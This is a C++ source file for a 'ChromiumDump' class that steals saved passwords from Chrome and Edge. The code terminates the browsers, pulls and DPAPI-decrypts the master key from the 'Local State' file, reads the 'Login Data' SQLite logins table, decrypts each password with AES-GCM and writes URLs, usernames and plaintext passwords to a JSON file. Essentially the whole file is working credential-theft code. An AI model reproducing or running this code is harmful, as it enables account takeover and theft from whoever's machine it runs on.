#include "ChromiumDump.h"

/*
	Contains all of the fun code for dumping creds
*/


/*
	Private Functions
*/
bool ChromiumDump::TerminateBrowsers(vector<wstring> denylist) {
	/*
		Terminates all active processes which have an EXE name in denylist
		Returns false if OpenProcess or TerminateProcess failed for any process, true otherwise
	*/
	bool success = true;
	if (denylist.empty())
		denylist = vector<wstring>{ L"chrome.exe", L"msedge.exe" };

	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);

	// iterate through all processes
	do
	{
		wstring wideStringExeFile(procEntry.szExeFile);
		// if the name is in the denylist, terminate it
		if (find(denylist.begin(), denylist.end(), wideStringExeFile) != denylist.end()) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, NULL, procEntry.th32ProcessID);
			if (hProcess) {
				// if process is not successfully terminated, the return value is set to false but the loop continues   
				if (!TerminateProcess(hProcess, 0))
					success = false;
			}
			else {
				success = false;
			}
		}
	} while (Process32Next(hTH32, &procEntry));
	return success;
}


bool ChromiumDump::GetBrowserPaths(wstring userProfile) {
	const wstring environmentVariableLocalAppData = L"%LOCALAPPDATA%";
	const wstring loginData = L"Login Data";
	const wstring localState = L"Local State";

	// Figure out how much space we need to allocate 
	DWORD dwLenAppDataPath = ExpandEnvironmentStringsW(environmentVariableLocalAppData.c_str(), nullptr, 0);
	wchar_t* localAppDataPath = new wchar_t[dwLenAppDataPath];
	// Get the path of %LOCALAPPDATA% and temporarily store it to localAppDataPath before moving it to wstring
	if (ExpandEnvironmentStringsW(environmentVariableLocalAppData.c_str(), localAppDataPath, dwLenAppDataPath) == 0)
		return false;
	
	wstring wsLocalAppData(localAppDataPath);
	delete[] localAppDataPath;

	// Concatenate the full paths and store them in private class member variables 
	this -> localStatePath = wsLocalAppData +L"\\" + this->browserDataPath + L"\\" + localState;
	this -> loginDataPath = wsLocalAppData + L"\\" + this->browserDataPath + L"\\" + userProfile + L"\\" + loginData;
#ifdef _DEBUG
	std::wcout << L"[*] LocalState: " << this->localStatePath << endl;
	std::wcout << L"[*] LoginData: " << this->loginDataPath << endl;
#endif
	return true;
}


DATA_BLOB ChromiumDump::PullMasterKey() {
	/*
		Pull master key from Local State file, base64 decode it, and then decrypt it to reveal raw key
	*/
	std::string base64Key = "";
	DWORD cbData = 0;
	BYTE* pbBinary;
	DATA_BLOB masterKeyEncrypted;
	DATA_BLOB masterKeyDecrypted;
	masterKeyEncrypted.cbData = 0;
	masterKeyEncrypted.pbData = nullptr;

	try {
		ifstream localStateStream(localStatePath);
		json localStateJSON = json::parse(localStateStream);
		if (localStateJSON.contains("os_crypt") && localStateJSON["os_crypt"].contains("encrypted_key")) {
			base64Key = localStateJSON["os_crypt"]["encrypted_key"];
#ifdef _DEBUG
			cout << "[*] Encrypted master key: " << base64Key.c_str() << endl;
#endif
		}
	}
	catch (exception e) {
#ifdef _DEBUG
		wcout << "[-] Failed to pull master key from LocalState JSON\n";
#endif
		return masterKeyEncrypted;
	}

	// Get the length of the buffer needed to hold the decoded data
	if (!CryptStringToBinaryA(base64Key.c_str(), NULL, CRYPT_STRING_BASE64, NULL, &cbData, 0, NULL))
		return masterKeyEncrypted;
	else 
		pbBinary = (BYTE*)malloc(cbData);
	
	// Base64 decode data and verify that first 5 bytes are DPAPI
	if (!CryptStringToBinaryA(base64Key.c_str(), NULL, CRYPT_STRING_BASE64, pbBinary, &cbData, 0, NULL) ||
		memcmp(pbBinary, "DPAPI", strlen("DPAPI")) != 0) {
			free(pbBinary);
			return masterKeyEncrypted;
	}

	// Add Base64 decoded data to DATA_BLOB structure so we can decrypt it
	masterKeyEncrypted.cbData = cbData - 5;
	masterKeyEncrypted.pbData = pbBinary + 5;

	masterKeyDecrypted.cbData = cbData;
	BYTE* pbDecryptedData = (BYTE*)malloc(cbData);
	if(pbDecryptedData != 0)
		ZeroMemory(pbDecryptedData, cbData);
	masterKeyDecrypted.pbData = pbDecryptedData;

	// Attempt to use DPAPI to decrypt the masterkey
	if (!CryptUnprotectData(&masterKeyEncrypted, NULL, NULL, NULL, NULL, 0, &masterKeyDecrypted)) {
		masterKeyDecrypted.pbData = nullptr;
		masterKeyDecrypted.cbData = 0;
		free(pbDecryptedData);
		free(pbBinary);
		return masterKeyDecrypted;
	}
	this->masterKey = masterKeyDecrypted;
	return masterKeyDecrypted;
}


string ChromiumDump::DecryptPassword(LPCVOID pEncryptedPass, DWORD dwLenEncryptedPass, BYTE key[]) {
	/*
		Decrypts encrypted password with given key
	
		pEncryptedPass byte structure:
		[00-02]: "v10" - 3 byte signature
		[03-14]: Nonce - 12 byte Initialization Vector (IV)
		[15-XX]: EncryptedData 
		[-16-]: Tag - 16 byte authentication tag 

		Credit:
		https://stackoverflow.com/questions/57456546/how-do-i-use-aes-gmac-with-a-secret-in-bcrypt
		https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_chrome.c 
	*/
	std::string ret = "";
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
	BCRYPT_ALG_HANDLE hAlgorithm;
	BCRYPT_KEY_HANDLE hKey;
	PUCHAR pDecryptedPass;
	DWORD dwLenDecryptedPass;

	if(BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
		wcout << L"[-] Failed to open algorithm provider\n";
	if(BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))
		wcout << L"[-] Failed to set GCM property\n";
	if(BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, AES_KEY_BYTES, 0) != STATUS_SUCCESS)
		wcout << L"[-] Failed to generate symmetric key\n";
	if ((dwLenEncryptedPass >= sizeof(v10)) && memcmp(pEncryptedPass, v10, sizeof(v10)) == 0)
	{
		if (hAlgorithm && hKey)
		{
			BCRYPT_INIT_AUTH_MODE_INFO(info);
			info.pbNonce = (PBYTE)pEncryptedPass + sizeof(v10);
			info.cbNonce = 12;
			info.pbTag = info.pbNonce + dwLenEncryptedPass - (sizeof(v10) + 16);
			info.cbTag = 16;
			PUCHAR pEncryptedData = info.pbNonce + info.cbNonce;
			dwLenDecryptedPass = dwLenEncryptedPass - (sizeof(v10) + info.cbNonce + info.cbTag);
			if (pDecryptedPass = (PUCHAR)malloc(dwLenDecryptedPass))
			{
				if (BCryptDecrypt(hKey, pEncryptedData, dwLenDecryptedPass, &info, NULL, 0,
					pDecryptedPass, dwLenDecryptedPass, &dwLenDecryptedPass, 0) == STATUS_SUCCESS) {
					wcout << L"[+] Successfully decrypted data\n";
					string s = string((char*)pDecryptedPass);
					ret = s.substr(0, dwLenDecryptedPass);
				}
				else {
					wcout << L"[-] Failed to decrypt data\n";
					ret = "";
				}
				free(pDecryptedPass);
			}
		}
		if (hAlgorithm && BCryptCloseAlgorithmProvider(hAlgorithm, 0) != STATUS_SUCCESS)
			wcout << L"[-]Failed to close algorithm provider\n";
		if (hKey && BCryptDestroyKey(hKey) != STATUS_SUCCESS)
			wcout << L"[-]Failed to destroy key\n";
	}
	return ret;
}


bool ChromiumDump::LoadSqliteDb(wstring path) {
	int dbErrorCode = 0;
	if (dbErrorCode = sqlite3_open16(path.c_str(), &(this -> db)) != SQLITE_OK) {
		wcout << "[-] Error opening database " << path << endl;
		cout << sqlite3_errstr(dbErrorCode) << endl;
		return false;
	}
	return true;
}


bool ChromiumDump::UnloadSqliteDb() {
	int dbErrorCode = 0;
	if (dbErrorCode = sqlite3_close(this -> db) != SQLITE_OK) {
		cout << "[-] Error closing database\n" << sqlite3_errstr(dbErrorCode) << endl;
		return false;
	}
	return true;
}


bool ChromiumDump::ParseSqliteDb() {
	sqlite3_stmt* pStmt;
	const char** pzTail = NULL;
	const char* query = "SELECT origin_url, username_value, password_value FROM logins";
	int dbErrorCode = sqlite3_prepare_v3(this -> db, query, strlen(query) + 1, 0, &pStmt, pzTail);

	if (dbErrorCode != SQLITE_OK) {
		cout << "[-] Error with SQL prepare\n" << sqlite3_errstr(dbErrorCode) << endl;
		return false;
	}
	

	int i = 0;
	while (dbErrorCode = sqlite3_step(pStmt), dbErrorCode == SQLITE_ROW) {
		string url = string((char*)sqlite3_column_text(pStmt, 0));
		string user = string((char*)sqlite3_column_text(pStmt, 1));

		int encryptedDataSize = sqlite3_column_bytes(pStmt, 2);
		const void* passwordBlobEncrypted = sqlite3_column_blob(pStmt, 2);
		string password = this->DecryptPassword(passwordBlobEncrypted, encryptedDataSize, masterKey.pbData);
#ifdef _DEBUG
		cout << url << "\n\t" << user << ":" << password << endl;
#endif
		this->jsonData["creds"][this->browserNickName][i] = json();
		this->jsonData["creds"][this->browserNickName][i]["url"] = url;
		this->jsonData["creds"][this->browserNickName][i]["user"] = user;
		this->jsonData["creds"][this->browserNickName][i]["pass"] = password;
		i++;
	}

	if (sqlite3_finalize(pStmt) == SQLITE_OK)
		return true;
	return false;
}

/*
	Public Functions
*/
ChromiumDump::ChromiumDump(wstring browserDataPath, wstring browserExeName, bool killBrowsers) {
	this -> killBrowsers = killBrowsers;
	this -> browserDataPath = browserDataPath;
	this -> browserExeName = browserExeName;
	wstring wsBrowserNickName = this->browserExeName.substr(0, browserExeName.find(L"."));
	this -> browserNickName = string(wsBrowserNickName.begin(), wsBrowserNickName.end());

	this -> jsonData = json();
	this -> jsonData["creds"] = json();
}


bool ChromiumDump::DumpPasswordData() {
	vector<wstring> browsers{ this->browserExeName };
	if (killBrowsers && TerminateBrowsers(browsers)) {
		wcout << L"[*] Successfully terminated browsers\n";
	}
	else {
		wcout << L"[-] Failed to terminate browsers\n";
		return false;
	}
	if (!this->GetBrowserPaths()) {
		wcout << L"[-] Failed to get browser paths\n";
		return false;
	}
	if (this->PullMasterKey().pbData == nullptr) {
		wcout << L"[-] Failed to get and decrypt master key\n";
		return false;
	}
	this -> jsonData["creds"][this -> browserNickName] = json();

	if (!this->LoadSqliteDb(this->loginDataPath)) {
		return false;
	}
	if (!this->ParseSqliteDb()) {
		wcout << L"[-] Failed to parse SQLite database\n";
	}

	return true;
}


bool ChromiumDump::WriteJSON(wstring path) {
	wcout << L"[*] Dumping JSON to " << path << endl;
	try {
		ofstream jsonOut(path);
		jsonOut << setw(4) << this->jsonData << endl;
	}
	catch (exception e){
		wcout << "[*] Failed to write JSON data\n";
		return false;
	}
	return true;
}